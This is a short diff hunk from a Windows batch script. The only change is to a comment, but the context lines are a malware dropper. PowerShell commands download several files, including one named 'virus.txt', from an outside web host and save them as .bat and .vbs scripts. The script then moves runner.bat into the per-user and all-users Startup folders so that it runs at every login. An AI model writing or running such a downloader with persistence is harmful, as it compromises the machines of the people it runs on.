@@ -4,7 +4,7 @@ Powershell -Command "Invoke-WebRequest 'https://www.exampal.com/runner.txt' -Out
 powershell -command "& { iwr https://www.exampal.com/starter.txt -OutFile stsrter.vbs }"
 powershell -command "& { iwr https://www.exampal.com/virus.txt -OutFile virus.bat }"
 
-:: copy all files in destination.
+:: Move all files in destination.
 move /y "runner.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.*"
 move /y "runner.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\*.*"
 
